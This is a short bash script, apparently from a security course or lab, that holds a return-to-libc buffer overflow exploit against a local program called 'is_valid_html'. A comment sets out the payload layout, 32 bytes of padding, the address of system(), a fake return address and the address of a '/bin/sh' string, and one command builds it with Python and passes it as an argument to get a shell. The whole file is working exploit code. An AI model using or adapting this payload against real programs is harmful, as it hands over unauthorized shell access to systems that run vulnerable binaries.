#!/bin/bash
# Sumesh Kumar
# Return-to-libc exploit for is_valid_html

# Payload structure:
# 32 bytes padding + system() address + fake return + "/bin/sh" address

./is_valid_html test.$(python -c "print 'A'*32 + '\x10\x33\xe5\xb7' + 'AAAA' + '\x4c\x5d\xf7\xb7'")
